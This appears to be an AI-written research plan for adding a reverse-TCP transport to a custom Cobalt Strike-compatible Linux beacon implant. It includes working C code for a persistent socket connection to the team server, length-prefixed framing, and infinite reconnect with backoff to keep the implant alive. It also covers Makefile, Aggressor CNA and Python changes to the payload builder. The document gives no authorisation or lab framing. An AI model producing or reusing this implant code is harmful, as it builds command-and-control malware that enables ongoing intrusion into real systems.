# Phase 3: Reverse TCP Transport Mode - Research

**Researched:** 2026-02-26
**Domain:** C POSIX sockets, compile-time transport abstraction, Aggressor CNA scripting, Python build tooling
**Confidence:** HIGH — all findings derived from direct source inspection of the actual codebase

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

**Transport Mode Selection (Aggressor CNA)**
- TCP mode is auto-derived from listener type at Generate click — no explicit transport dropdown needed
- Supported listener type for TCP: `windows/beacon_tcp/reverse_tcp`
- Dialog switches from `drow_listener_stage` to `drow_listener` (shows all listener types, including stageless/TCP)
- Static dialog description updated to: "Supports HTTP, HTTPS, and TCP listeners"
- On Generate click: detect `payloadType` → map to transport mode string (`http` / `https` / `tcp`)
- Validation: extend existing check to accept `reverse_tcp` alongside `reverse_http` and `reverse_https`
- Updated error message: "Only reverse_http, reverse_https, and reverse_tcp are supported."
- Log `[Transport: <mode>]` to CS console at the start of each generation run
- If operator fills a Profile Path but selects a TCP listener: log a warning in CS console (e.g., `[TCP MODE] Profile path ignored`) — do not error
- TCP profile path is not passed to generation scripts; profile is irrelevant for TCP
- Success message includes transport mode: `"TCP implant generated at ..."` (vs generic message for HTTP/S)
- No live dialog field greying or dynamic description — detection happens only at Generate click

**InsertListenerInfo.py Interface Migration**
- Clean break: replace the old `0`/`1` HTTPS flag arg with a transport mode string (`http` / `https` / `tcp`)
- New call signature: `python3 InsertListenerInfo.py <host> <port> <transport_mode> [<profile_path>]`
- Profile path arg is omitted (not passed as empty string) when transport mode is `tcp`
- No backwards compatibility with old `0`/`1` flag — CNA is the only caller and is updated in the same phase

**TCP Transport Module (`tcp.c` / `tcp.h`)**
- New source file: `implant/src/tcp.c` and `implant/headers/tcp.h` — mirrors existing `http.c`/`http.h` pattern
- Persistent connection: beacon connects once, holds socket open across all check-in cycles
- Reconnect triggers only on socket error (handled by reconnect/backoff policy — see Phase 3 plans)

**Unified Transport Interface (`transport.h`)**
- `transport.h` declares a unified interface consumed by `beacon.c`:
  - `transport_checkin()` — sends metadata, reads task response
  - `transport_send_output()` — sends callback data
- `beacon.c` calls `transport_checkin()` and `transport_send_output()` — no `#ifdef` at call sites
- Compile-time selection via `#ifdef TRANSPORT_TCP`: Makefile links either `tcp.o` or `http.o`

**TCP Wire Protocol**
- Framing: length-prefixed — `[4 bytes big-endian length][payload blob]` per message
- Payload structure reused exactly: same `[counter][length][encrypted data][HMAC]` structure as HTTP/S — no new wire format
- Request-response model: beacon sends check-in packet, then blocks/reads synchronously for task response; sleeps between cycles
- Existing `beacon_checkin()` encrypt/HMAC logic is unchanged

### Claude's Discretion
- RSA key injection step for TCP builds (whether `InsertPublicKey.py` applies to TCP)
- Socket fd storage location (global state vs `beacon_state_t`)
- `transport_connect()` initialization placement in the beacon main loop
- Exact Makefile variable name for transport mode flag (e.g., `TRANSPORT=tcp` vs `TRANSPORT_TCP=1`)
- Error handling and errno reporting within `tcp.c`

### Deferred Ideas (OUT OF SCOPE)
None — discussion stayed within phase scope.
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|-----------------|
| NET-01 | Beacon supports reverse TCP transport mode in addition to existing HTTP/S mode. | `tcp.c`/`tcp.h` new source files mirroring `http.c`/`http.h`; `transport.h` unified interface; compile-time `#ifdef TRANSPORT_TCP` selection in Makefile |
| NET-02 | Operator can select transport mode (`http`, `https`, `tcp`) during payload generation. | CNA dialog change (`drow_listener` → auto-derive transport from listener type); `InsertListenerInfo.py` new `transport_mode` string arg replacing `0`/`1` HTTPS flag |
| NET-03 | Beacon performs bounded reconnect/backoff in TCP mode without process termination. | POSIX `connect()` retry loop in `tcp.c` with exponential backoff; socket-level error detection (`errno`); bounded max delay cap |
</phase_requirements>

---

## Summary

Phase 3 adds TCP as a second transport option to a working Cobalt Strike-compatible implant. The existing codebase has a clean, layered structure: `beacon.c` handles protocol logic (metadata generation, encrypt/HMAC, task dispatch), and `http.c` handles transport I/O. The TCP module must slot into that exact same boundary — `beacon.c` must not know whether it is talking to HTTP or TCP at call sites.

The critical architectural decision is that transport selection is compile-time only, via `#ifdef TRANSPORT_TCP` in the Makefile. This means `transport.h` provides a stable interface (`transport_checkin()` / `transport_send_output()`), and the Makefile links exactly one of `tcp.o` or `http.o`. The `beacon.c` callsites for `http_get()` / `http_post()` must be replaced with `transport_checkin()` / `transport_send_output()` calls — and `http.c` must implement those same symbols for the HTTP/S build path.

The Aggressor CNA script and `InsertListenerInfo.py` are the other major change surface. The CNA currently uses `drow_listener_stage` (staged listeners only) and passes an integer `0`/`1` HTTPS flag to `InsertListenerInfo.py`. Both must be updated: CNA to `drow_listener` and transport-mode string detection; `InsertListenerInfo.py` to accept a `transport_mode` string argument and skip profile-loading entirely for TCP mode.

**Primary recommendation:** Model everything on the existing `http.c`/`http.h` pattern. For each function in `http.c` that `beacon.c` calls, create an identically-shaped function in `tcp.c`, then introduce `transport.h` as the common header that both implement. The Makefile gets a `TRANSPORT` variable; the CNA and Python script changes are mechanical once the C layer is designed.

---

## Standard Stack

### Core

| Library / Tool | Version | Purpose | Why Standard |
|----------------|---------|---------|--------------|
| POSIX sockets (`<sys/socket.h>`, `<netinet/in.h>`, `<arpa/inet.h>`) | POSIX.1-2017 | TCP connect/send/recv | Already present in codebase (`beacon.c` already `#include <arpa/inet.h>`, `<sys/socket.h>`) |
| `<netdb.h>` / `getaddrinfo()` | POSIX | Hostname resolution for TCP connect | Preferred over `gethostbyname()` — reentrant, IPv6-ready |
| `<errno.h>` | C standard | Error detection in socket operations | Required for `ECONNREFUSED`/`ETIMEDOUT` detection in reconnect logic |
| `<unistd.h>` / `usleep()` | POSIX | Backoff delay | Already used in `main.c` for sleep |
| GNU `make` | System make | Compile-time transport variant selection via `TRANSPORT_TCP=1` flag | Already used; extend with new variable |
| Python 3 | Already present | `InsertListenerInfo.py` migration | No new dependency |
| Aggressor Script (CNA) | CS 4.x | Operator generation dialog | Existing CNA is the only change surface |

### Supporting

| Tool | Purpose | When to Use |
|------|---------|-------------|
| `connect()` with `SOCK_STREAM` | Establish persistent TCP connection to Team Server | TCP checkin and output calls |
| `send()` / `recv()` | Length-prefixed frame I/O | Framed message exchange over persistent socket |
| `SO_KEEPALIVE` socket option | Detect silent TCP disconnections | Set on socket after `connect()` to catch dead peers |
| `fcntl()` / `O_NONBLOCK` + `select()` | Optional: non-blocking connect with timeout | Only if blocking connect is a problem in practice |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Blocking `connect()` + retry loop | Non-blocking connect with `select()` | Blocking is simpler and sufficient for beacon's single-threaded model; non-blocking adds complexity without operational benefit |
| Global `int g_tcp_fd` for socket state | Adding `tcp_fd` field to `beacon_state_t` | Both work; CONTEXT marks this as Claude's discretion. Global state is simpler and consistent with existing `g_beacon_state` / `g_sleep_time_ms` pattern. `beacon_state_t` is cleaner but requires threading the state pointer through `transport_*` calls. |
| `TRANSPORT_TCP=1` Makefile flag | `TRANSPORT=tcp` string variable | String variable is more readable but requires `ifeq` instead of `ifdef`; both work. CONTEXT marks exact name as discretion. |

**Installation:** No new packages. All dependencies are POSIX standard headers already present.

---

## Architecture Patterns

### Recommended Project Structure

```
implant/
├── src/
│   ├── beacon.c          # Calls transport_checkin() / transport_send_output()
│   ├── http.c            # Implements transport_checkin/transport_send_output for HTTP/S
│   ├── tcp.c             # NEW: implements transport_checkin/transport_send_output for TCP
│   └── main.c            # Calls transport_connect() before main loop (TCP path)
├── headers/
│   ├── transport.h       # NEW: unified interface — both http.c and tcp.c implement this
│   ├── http.h            # Retained for http-internal declarations (write_callback etc.)
│   ├── tcp.h             # NEW: tcp-internal declarations
│   └── beacon.h          # Unchanged
generate-payload/
│   ├── InsertListenerInfo.py   # Updated: transport_mode string arg, skip profile for tcp
│   └── ... (other scripts unchanged)
CustomBeacon.cna            # Updated: drow_listener, transport detection, new validation
```

### Pattern 1: Compile-Time Transport Interface (`transport.h`)

**What:** A header declaring two symbols that both `http.c` and `tcp.c` implement. `beacon.c` includes only `transport.h`, never `http.h` or `tcp.h`.

**When to use:** Mandatory — this is how `beacon.c` calls transport without `#ifdef` at call sites.

**Example:**
```c
/* implant/headers/transport.h */
/* Source: derived from existing http.h pattern in this codebase */
#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stddef.h>
#include <stdint.h>

/*
 * Send beacon check-in metadata; receive task blob from server.
 * Returns 0 on success, -1 on error.
 * On success, *task_data is malloc'd — caller must free.
 */
int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len);

/*
 * Send callback output to server.
 * Returns 0 on success, -1 on error.
 */
int transport_send_output(const uint8_t *data, size_t data_len,
                          const char *session_id);

/*
 * Establish transport connection (TCP: connect; HTTP: no-op or profile load).
 * Called once before main loop. Returns 0 on success.
 */
int transport_connect(void);

#endif /* TRANSPORT_H */
```

### Pattern 2: TCP Module Mirrors `http.c` Shape

**What:** `tcp.c` provides `transport_connect()`, `transport_checkin()`, and `transport_send_output()`. HTTP/S build requires renaming `http_get()`/`http_post()` wrappers to implement the same symbols.

**When to use:** For both new `tcp.c` and updated `http.c`.

**Example — TCP checkin structure:**
```c
/* implant/src/tcp.c — Source: derived from http.c in this codebase */
#include "transport.h"
#include "tcp.h"
#include "profile.h"
#include "debug.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

/* Persistent socket — held open across all check-in cycles */
static int g_tcp_fd = -1;

int transport_connect(void) {
    /* resolve, connect, set SO_KEEPALIVE */
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", profile_get_port());

    if (getaddrinfo(profile_get_server(), port_str, &hints, &res) != 0) {
        ERROR_PRINT("getaddrinfo failed\n");
        return -1;
    }

    g_tcp_fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (g_tcp_fd < 0) { freeaddrinfo(res); return -1; }

    int opt = 1;
    setsockopt(g_tcp_fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

    if (connect(g_tcp_fd, res->ai_addr, res->ai_addrlen) != 0) {
        ERROR_PRINT("connect failed: %s\n", strerror(errno));
        close(g_tcp_fd); g_tcp_fd = -1;
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);
    return 0;
}

int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len) {
    /* send framed metadata; recv framed task response */
    /* Frame: [4 bytes big-endian length][payload] */
    uint32_t len_be = htonl((uint32_t)metadata_len);
    if (send(g_tcp_fd, &len_be, 4, MSG_NOSIGNAL) != 4) {
        close(g_tcp_fd); g_tcp_fd = -1;
        return -1;
    }
    if (send(g_tcp_fd, metadata, metadata_len, MSG_NOSIGNAL) != (ssize_t)metadata_len) {
        close(g_tcp_fd); g_tcp_fd = -1;
        return -1;
    }
    /* recv response length prefix */
    uint32_t resp_len_be = 0;
    if (tcp_recv_exact(g_tcp_fd, (uint8_t*)&resp_len_be, 4) != 0) {
        close(g_tcp_fd); g_tcp_fd = -1;
        return -1;
    }
    size_t resp_len = ntohl(resp_len_be);
    if (resp_len == 0) { *task_data = NULL; *task_len = 0; return 0; }

    uint8_t *buf = malloc(resp_len);
    if (!buf) return -1;
    if (tcp_recv_exact(g_tcp_fd, buf, resp_len) != 0) {
        free(buf); close(g_tcp_fd); g_tcp_fd = -1;
        return -1;
    }
    *task_data = buf;
    *task_len  = resp_len;
    return 0;
}
```

### Pattern 3: Reconnect/Backoff in Main Loop

**What:** When `transport_checkin()` or `transport_send_output()` returns -1, the main loop calls `transport_connect()` again with bounded exponential backoff. The process does NOT terminate.

**When to use:** NET-03 requirement. Applies to TCP path only; HTTP/S error handling is unchanged.

**Example:**
```c
/* implant/src/main.c — main loop TCP reconnect extension */
/* Source: derived from existing beacon main loop in this codebase */

#define TCP_RECONNECT_BASE_MS   2000
#define TCP_RECONNECT_MAX_MS  120000
#define TCP_RECONNECT_MAX_ATTEMPTS  0   /* 0 = infinite */

static int g_tcp_reconnect_delay_ms = TCP_RECONNECT_BASE_MS;

/* called after transport_checkin() returns -1 */
static void handle_transport_error(void) {
    DEBUG_PRINT("[TCP] transport error — reconnect in %dms\n", g_tcp_reconnect_delay_ms);
    usleep(g_tcp_reconnect_delay_ms * 1000);
    g_tcp_reconnect_delay_ms *= 2;
    if (g_tcp_reconnect_delay_ms > TCP_RECONNECT_MAX_MS)
        g_tcp_reconnect_delay_ms = TCP_RECONNECT_MAX_MS;
    transport_connect();   /* attempt reconnect; if fails, next iteration retries */
}
```

### Pattern 4: Makefile Transport Variant

**What:** Makefile `TRANSPORT` variable gates which transport object is compiled in and which preprocessor flag is set.

**Example:**
```makefile
# implant/Makefile — Source: extension of existing Makefile in this codebase
TRANSPORT ?= http

ifeq ($(TRANSPORT),tcp)
  TRANSPORT_OBJ = $(OBJ_DIR)/$(SRC_DIR)/tcp.o
  CFLAGS += -DTRANSPORT_TCP
else
  TRANSPORT_OBJ = $(OBJ_DIR)/$(SRC_DIR)/http.o
endif

# Remove http.o from wildcard sources, replace with transport obj
SOURCES_ALL = $(wildcard $(SRC_DIR)/*.c) $(wildcard $(ELFLOADER_SRC_DIR)/*.c)
SOURCES     = $(filter-out $(SRC_DIR)/http.c $(SRC_DIR)/tcp.c, $(SOURCES_ALL))
OBJECTS     = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES)) $(TRANSPORT_OBJ)
```

### Pattern 5: CNA Transport Detection

**What:** In the `genPayload` callback, replace the `$HTTPSvalue` integer with a `$transportMode` string derived from `$payloadType`.

**Example:**
```
/* CustomBeacon.cna — Source: extension of existing CNA in this codebase */

$transportMode = "http";   # default
if ($payloadType eq "windows/beacon_https/reverse_https") {
    $transportMode = "https";
} else if ($payloadType eq "windows/beacon_tcp/reverse_tcp") {
    $transportMode = "tcp";
} else if ($payloadType ne "windows/beacon_http/reverse_http") {
    show_message("Only reverse_http, reverse_https, and reverse_tcp are supported.");
    return;
}
blog($1, "[Transport: $transportMode]");

if ($transportMode eq "tcp" && $ProfilePath ne "../profiles/http/default-profile.json") {
    blog($1, "[TCP MODE] Profile path ignored — TCP transport does not use HTTP profiles");
}
```

### Pattern 6: InsertListenerInfo.py Transport Mode Migration

**What:** Replace `https_value: int` argument with `transport_mode: str`. For TCP, skip profile loading entirely and write a minimal TCP config header directly.

**Example:**
```python
# generate-payload/InsertListenerInfo.py — Source: derived from existing script
def parse_args(argv):
    parser = argparse.ArgumentParser(...)
    parser.add_argument("target_server")
    parser.add_argument("target_port", type=int)
    parser.add_argument("transport_mode", choices=["http", "https", "tcp"])
    parser.add_argument("profile_path", nargs="?", default=str(DEFAULT_PROFILE))
    return parser.parse_args(argv)

def insert_listener_info(target_server, target_port, transport_mode, profile_path):
    if transport_mode == "tcp":
        # Write minimal TCP config header — no profile file involved
        _write_tcp_config_header(target_server, target_port)
        return 0
    # ... existing HTTP/S profile path (use_https derived from transport_mode)
    https_value = 1 if transport_mode == "https" else 0
    ...
```

### Anti-Patterns to Avoid

- **`#ifdef TRANSPORT_TCP` inside `beacon.c`:** The whole point of `transport.h` is to eliminate these. `beacon.c` must never check the transport type at runtime or compile time.
- **Calling `http_get()` / `http_post()` directly from `beacon.c` after the refactor:** All HTTP callsites in `beacon.c` (`beacon_checkin()` and `beacon_send_output()`) must migrate to `transport_checkin()` / `transport_send_output()`.
- **Closing the TCP socket between check-in cycles:** The CONTEXT decision is a persistent connection. Close only on error.
- **Passing empty string for profile_path in TCP mode from CNA:** CONTEXT requires omitting the argument entirely, not passing `""`.
- **Using `MSG_NOSIGNAL` on macOS (future concern):** Linux only — TCP module is for Linux. Note for when the macOS stream adds TCP.
- **Partial `recv()` assumption:** `recv()` may return less than requested. Always use a `tcp_recv_exact()` helper that loops until all bytes are received or socket error occurs.
- **Using `gethostbyname()` instead of `getaddrinfo()`:** `gethostbyname()` is deprecated; use `getaddrinfo()` for proper resolution.

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| TCP framing | Custom binary protocol | Length-prefixed frames with `[4B len][payload]` — already decided in CONTEXT | Matches existing `beacon_send_output()` packet format exactly; no new parsing needed on Team Server side |
| Reconnect backoff | Complex state machine | Simple exponential doubling with `usleep()` cap | `usleep()` already used in `main.c`; no scheduler needed for single-threaded beacon |
| Hostname resolution | Manual `inet_pton()` | `getaddrinfo()` | Handles both IP literals and hostnames; already handles DNS; POSIX standard |
| Exact-read helper | Inline recv loop | `tcp_recv_exact()` internal helper in `tcp.c` | `recv()` can return short reads; this is always needed |
| Profile validation for TCP | New TCP profile schema | Skip profile entirely for TCP | TCP has no HTTP profile concept; CONTEXT decision is to omit profile path |

**Key insight:** The wire payload for TCP is identical to HTTP — it's the same `[counter][length][encrypted data][HMAC]` blob with a length prefix added. TCP is a transport wrapper around an already-designed protocol.

---

## Common Pitfalls

### Pitfall 1: Partial recv() on Task Response

**What goes wrong:** `recv()` returns fewer bytes than requested. Code reads the 4-byte length prefix correctly but then assumes a single `recv()` delivers the full task blob.

**Why it happens:** TCP is a stream protocol. The kernel may split or coalesce data.

**How to avoid:** Write `tcp_recv_exact(int fd, uint8_t *buf, size_t n)` that loops `recv()` until `n` bytes accumulated or error. Use this for both the length-prefix read and the payload read.

**Warning signs:** Intermittent task decryption failures or HMAC verification errors — the decrypted data is truncated/corrupted.

### Pitfall 2: `send()` Returning EPIPE / SIGPIPE

**What goes wrong:** Writing to a closed TCP socket raises `SIGPIPE`, which terminates the process by default.

**Why it happens:** Server closed the connection; beacon tries to send.

**How to avoid:** Use `MSG_NOSIGNAL` flag on all `send()` calls (Linux only, already confirmed this is Linux x64). Also set `SO_NOSIGPIPE` at socket creation as belt-and-suspenders on some systems, though `MSG_NOSIGNAL` is sufficient on Linux.

**Warning signs:** Process silently dies after network interruption without cleanup.

### Pitfall 3: Blocking `connect()` Hanging the Process

**What goes wrong:** `connect()` blocks for minutes on a firewalled port that drops packets (no TCP RST returned). The beacon hangs.

**Why it happens:** Default TCP connect timeout is OS-controlled (~2 minutes on Linux).

**How to avoid:** In the reconnect/backoff loop, use a reasonable approach. The simplest: set `SO_SNDTIMEO` and `SO_RCVTIMEO` on the socket before calling `connect()`. This constrains the blocking duration to a bounded time without requiring `fcntl()` / `select()` complexity.

```c
struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
setsockopt(g_tcp_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
setsockopt(g_tcp_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
```

**Warning signs:** Beacon disappears from operator console during network disruption and never reconnects; process is alive but stuck in `connect()`.

### Pitfall 4: Forgetting `htonl()` on Length Prefix

**What goes wrong:** The Team Server expects big-endian length prefix. If beacon writes host-endian on little-endian x64, the server misparses frame length and desynchronizes.

**Why it happens:** Endian bugs are silent until tested against a live server.

**How to avoid:** Always `htonl(len)` before sending the 4-byte length prefix. Always `ntohl(len)` after receiving. Cross-check against the existing `beacon_send_output()` code which already uses `htonl()` for packet length.

**Warning signs:** Team Server receives garbled callbacks or never shows beacon check-in. Difficult to diagnose without packet capture.

### Pitfall 5: InsertListenerInfo.py Old Callers

**What goes wrong:** The CNA or a developer tests `InsertListenerInfo.py` directly with the old `0`/`1` int argument format. The new `transport_mode` arg rejects it.

**Why it happens:** The interface is a clean break — no backwards compatibility by design.

**How to avoid:** CNA and script must be updated atomically in the same commit (Plan 03-02). Document the new call signature in a comment at the top of the script. The argparse `choices=["http","https","tcp"]` provides clear error output if called incorrectly.

**Warning signs:** `argparse` error at generation time: `argument transport_mode: invalid choice: '0'`.

### Pitfall 6: `beacon.c` Still Including `http.h` After Refactor

**What goes wrong:** After `beacon.c` migrates to `transport_checkin()` / `transport_send_output()`, it may still `#include "http.h"` and call `http_get()` / `http_post()` in some path.

**Why it happens:** The refactor touches multiple functions in `beacon.c`: `beacon_checkin()` and `beacon_send_output()` both call HTTP directly today.

**How to avoid:** After the refactor, `beacon.c` should only `#include "transport.h"` (not `http.h`). Remove `http.h` include from `beacon.c`. The linker will confirm correct symbol resolution.

**Warning signs:** Build succeeds even when only `tcp.o` is linked because `beacon.c` still directly calls `http_*` symbols that are undefined.

### Pitfall 7: TCP Build Includes `http.c` via Wildcard

**What goes wrong:** The Makefile currently uses `$(wildcard $(SRC_DIR)/*.c)` to find all sources. Adding `tcp.c` without adjusting the wildcard means both `http.o` and `tcp.o` are linked in TCP builds, causing duplicate symbol errors.

**Why it happens:** The wildcard pattern doesn't know about mutual-exclusivity of transport modules.

**How to avoid:** Explicitly exclude `http.c` and `tcp.c` from the wildcard-derived `SOURCES` list, then add only the relevant transport `.o` via `$(TRANSPORT_OBJ)`. (See Makefile pattern in Code Examples.)

**Warning signs:** `ld` error: multiple definition of `transport_checkin`.

---

## Code Examples

### Existing `beacon.c` Call Sites That Must Migrate

```c
/* Source: implant/src/beacon.c — current HTTP callsites to be replaced */

/* In beacon_checkin() — line ~447 */
if (http_get(profile_get_http_get_uri(), encrypted_metadata, encrypted_len, &response) != 0) { ... }

/* In beacon_send_output() — line ~635 */
int ret = http_post(profile_get_http_post_uri(), packet, total_len, session_id, &response);
```

After refactor, these become:
```c
/* beacon_checkin() replacement */
uint8_t *task_data = NULL;
size_t   task_len  = 0;
if (transport_checkin(encrypted_metadata, encrypted_len, &task_data, &task_len) != 0) { ... }
/* task_data is already the raw server response; pass to beacon_decrypt_tasks() */

/* beacon_send_output() replacement */
int ret = transport_send_output(packet, total_len, session_id);
```

### Existing `http_get()` / `http_post()` Wrapper Names for HTTP/S Transport

```c
/* Source: implant/src/http.c — existing functions become transport.h implementations */

/* http.c must now ALSO export: */
int transport_connect(void) { return 0; }  /* HTTP is connectionless — no-op */
int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len)
{
    /* wraps existing http_get() logic, populates *task_data / *task_len */
}
int transport_send_output(const uint8_t *data, size_t data_len, const char *session_id)
{
    /* wraps existing http_post() logic */
    http_response_t resp;
    int r = http_post(profile_get_http_post_uri(), data, data_len, session_id, &resp);
    http_response_free(&resp);
    return r;
}
```

### TCP Length-Prefixed Frame Helper

```c
/* Source: pattern required by CONTEXT wire protocol decision */

/* Helper: receive exactly n bytes, handling partial recv() */
static int tcp_recv_exact(int fd, uint8_t *buf, size_t n) {
    size_t received = 0;
    while (received < n) {
        ssize_t r = recv(fd, buf + received, n - received, 0);
        if (r <= 0) {
            ERROR_PRINT("tcp_recv_exact: recv returned %zd (errno=%d)\n", r, errno);
            return -1;
        }
        received += (size_t)r;
    }
    return 0;
}

/* Send a framed message: [4B big-endian length][payload] */
static int tcp_send_framed(int fd, const uint8_t *data, size_t len) {
    uint32_t len_be = htonl((uint32_t)len);
    if (send(fd, &len_be, 4, MSG_NOSIGNAL) != 4) return -1;
    if (send(fd, data, len, MSG_NOSIGNAL) != (ssize_t)len) return -1;
    return 0;
}

/* Recv a framed message: read length prefix, then payload */
static int tcp_recv_framed(int fd, uint8_t **out, size_t *out_len) {
    uint32_t len_be = 0;
    if (tcp_recv_exact(fd, (uint8_t *)&len_be, 4) != 0) return -1;
    size_t len = ntohl(len_be);
    if (len == 0) { *out = NULL; *out_len = 0; return 0; }
    uint8_t *buf = malloc(len);
    if (!buf) return -1;
    if (tcp_recv_exact(fd, buf, len) != 0) { free(buf); return -1; }
    *out = buf; *out_len = len;
    return 0;
}
```

### CNA Dialog and Validation Update (Key Diff)

```
/* Source: CustomBeacon.cna — key changes from current version */

/* BEFORE */
drow_listener_stage($dialog, "listener", "Listener: ");
dialog_description($dialog, "Creates a custom Beacon implant\n- Currently only supports HTTP/S listeners");

/* AFTER */
drow_listener($dialog, "listener", "Listener: ");
dialog_description($dialog, "Creates a custom Beacon implant\n- Supports HTTP, HTTPS, and TCP listeners");

/* BEFORE — genPayload validation */
if ($payloadType ne "windows/beacon_http/reverse_http" && $payloadType ne "windows/beacon_https/reverse_https")
{
    show_message("This is an invalid listener type! Only reverse_http and reverse_https are supported.");
    return;
}
$HTTPSvalue = ($payloadType eq "windows/beacon_https/reverse_https") ? "1" : "0";
$command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $HTTPSvalue . " " . $ProfilePath;

/* AFTER */
if ($payloadType eq "windows/beacon_http/reverse_http") {
    $transportMode = "http";
} else if ($payloadType eq "windows/beacon_https/reverse_https") {
    $transportMode = "https";
} else if ($payloadType eq "windows/beacon_tcp/reverse_tcp") {
    $transportMode = "tcp";
} else {
    show_message("Only reverse_http, reverse_https, and reverse_tcp are supported.");
    return;
}
blog($1, "[Transport: $transportMode]");
if ($transportMode eq "tcp" && $ProfilePath ne "../profiles/http/default-profile.json") {
    blog($1, "[TCP MODE] Profile path ignored");
}
if ($transportMode eq "tcp") {
    $command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " tcp";
} else {
    $command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $transportMode . " " . $ProfilePath;
}
```

### Makefile TCP Build Target Addition

```makefile
/* Source: implant/Makefile — extension of current Makefile */

TRANSPORT ?= http

ifeq ($(TRANSPORT),tcp)
  TRANSPORT_OBJ = $(OBJ_DIR)/$(SRC_DIR)/tcp.o
  CFLAGS        += -DTRANSPORT_TCP
else
  TRANSPORT_OBJ = $(OBJ_DIR)/$(SRC_DIR)/http.o
endif

# Exclude both transport sources from wildcard; add transport obj explicitly
SOURCES = $(filter-out $(SRC_DIR)/tcp.c $(SRC_DIR)/http.c,$(wildcard $(SRC_DIR)/*.c)) \
          $(wildcard $(ELFLOADER_SRC_DIR)/*.c)
OBJECTS = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES)) $(TRANSPORT_OBJ)
```

---

## State of the Art

| Old Approach | Current Approach | Impact |
|--------------|------------------|--------|
| `drow_listener_stage` (staged only) | `drow_listener` (all listener types) | Exposes TCP listeners in Aggressor dialog |
| `0`/`1` integer HTTPS flag to `InsertListenerInfo.py` | `"http"` / `"https"` / `"tcp"` transport string | Explicit, extensible, human-readable |
| `http_get()` / `http_post()` called directly in `beacon.c` | `transport_checkin()` / `transport_send_output()` via `transport.h` | Enables compile-time transport swapping without `#ifdef` in `beacon.c` |
| No TCP transport | `tcp.c` persistent socket with reconnect/backoff | Enables raw TCP C2 channel |

**Relevant to discretion areas:**

- **RSA key injection for TCP builds:** `InsertPublicKey.py` reads `publickey.txt` and patches `beacon.c` in-place. The RSA key is in `beacon.c` (not `http.c`). The same `InsertPublicKey.py` / `RemovePublicKey.py` pair applies equally to TCP builds — `beacon.c` still calls `crypto_rsa_encrypt()` in `beacon_checkin()`. No change to `InsertPublicKey.py` needed for TCP.

- **`transport_connect()` placement:** Should be called once before the main loop, after `beacon_init()` and `pivot_init()`. If it fails initially, the reconnect/backoff logic in the main loop handles it. The cleanest approach: `transport_connect()` called unconditionally in `main.c`, with `http.c` implementing it as a no-op.

---

## Open Questions

1. **TCP profile_config.h for TCP builds**
   - What we know: `InsertListenerInfo.py` currently writes `implant/generated/profile_config.h` which contains `PROFILE_C2_SERVER`, `PROFILE_C2_PORT`, `PROFILE_C2_USE_HTTPS` etc. `profile.c` reads these at compile time.
   - What's unclear: For TCP builds, `profile.c` still needs `PROFILE_C2_SERVER` and `PROFILE_C2_PORT` for `transport_connect()` to resolve the server. But `PROFILE_C2_USE_HTTPS`, URIs, user-agent, and headers are irrelevant.
   - Recommendation: `InsertListenerInfo.py` in TCP mode writes a minimal `profile_config.h` containing only `PROFILE_C2_SERVER` and `PROFILE_C2_PORT` (no URIs, no HTTPS flag, no headers). This keeps `profile.c` usable without modification, and `profile_get_server()` / `profile_get_port()` work normally in `tcp.c`. Alternative: `tcp.c` bypasses profile entirely and reads server/port from a `tcp_config.h` — but this adds a new header and a new Python rendering step. The minimal `profile_config.h` approach is simpler.

2. **Reconnect count limit**
   - What we know: CONTEXT says "bounded reconnect/backoff without process termination." The reconnect backoff cap is clear. Whether there is a max attempt count is not specified.
   - What's unclear: Should reconnects be truly infinite (retry until server is reachable) or terminate after N attempts?
   - Recommendation: Infinite retry with capped delay (120s) matches the typical beacon pattern — operators expect persistent implants. If a max is needed for testing, use a compile-time `TCP_MAX_RECONNECT_ATTEMPTS` defaulting to 0 (infinite).

3. **`transport_send_output()` session_id parameter for TCP**
   - What we know: `http_post()` takes `session_id` to build the URL query string (`?id=<agent_id>`). For TCP, the session ID is embedded in the outgoing framed payload (same `[counter][length][encrypted][HMAC]` format), not in a query string.
   - What's unclear: Does `transport_send_output()` signature need `session_id` in TCP mode?
   - Recommendation: Keep `session_id` in the `transport_send_output()` signature for interface uniformity (HTTP needs it). `tcp.c` implementation simply ignores it — the packet already encodes identity.

---

## Sources

### Primary (HIGH confidence)
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/src/beacon.c` — beacon_checkin(), beacon_send_output() call sites
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/src/http.c` — http_get(), http_post() shapes
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/headers/http.h` — existing transport interface shape
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/headers/beacon.h` — beacon_state_t fields
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/implant/Makefile` — wildcard source collection pattern
- Direct source inspection of `/opt/CobaltStrike-Linux-Beacon/CustomBeacon.cna` — current dialog/validation/generation flow
